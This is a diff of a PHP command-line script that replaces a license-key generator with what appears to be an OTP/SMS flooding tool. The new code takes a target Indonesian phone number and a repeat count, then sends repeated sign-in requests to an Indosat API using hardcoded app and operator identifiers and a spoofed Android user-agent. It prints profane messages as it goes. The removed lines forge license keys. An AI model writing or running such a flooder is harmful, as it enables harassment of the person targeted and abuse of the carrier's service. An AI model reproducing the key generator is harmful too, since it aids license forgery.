@@ -18,22 +18,32 @@ Team    : System Cyber Security
 Date    : 06-05-2019\n";
 echo $red."=====================================".$green."\n";
 sleep(1);
-echo "Masukan license awal: ";
-$lic = trim(fgets(STDIN));
-sleep(1);
-echo "Masukan jumlah generate : ";
+echo "\e[0;1m>>> Nomor Target\n(ex : 6285xxxxxxxxx) : ";
+$target = trim(fgets(STDIN));
+sleep(2);
+echo ">>> jumlah\nMasukan jumlah : ";
 $jum = trim(fgets(STDIN));
 for ($i=1; $i <= $jum; $i++) {
-$h = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-$a = "1234567890";
-$r = $h.$a;
-$go = str_shuffle($r);
-$rand = substr($go, rand(0,20), 6);
-$file = "list_key.txt";
-//menggabungkan license awal dengan hasil generate
-$res = $lic."-".$rand."\n";
-touch($file);
-$o = fopen($file, 'a');
-fwrite($o, $res);
-fclose($o);
-}
+$header = array("Content-Type: application/json", "operatorId: 50e22f864fc644c081c0e18319187547", "appId: 168e2950623a4dbe8a57beec814ad6b5", "clientVersion: 127");
+$post = array("msisdn" => "$target");
+$data = json_encode($post);
+$g = curl_init();
+curl_setopt($g, CURLOPT_URL, "https://osa-indosat.lotusflare.com/api/1.0/dcp/user/indosat_begin_sign_in");
+curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($g, CURLOPT_POST, 1);
+curl_setopt($g, CURLOPT_HEADER, 1);
+curl_setopt($g, CURLOPT_POSTFIELDS, $data);
+curl_setopt($g, CURLOPT_HTTPHEADER, $header);
+curl_setopt($g, CURLOPT_USERAGENT, "Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_X00AD Build/MMB29M)");
+$h = curl_exec($g);
+curl_close($g);
+
+preg_match("/challengeId/i", $h, $respon);
+if ($respon[0] == "challengeId") {
+	echo $i. ".Gass Terus Cok !!!\n";
+	}else{
+		echo $i. ".Gagal bangsat:(\n";
+		}
+	}
+
+?>
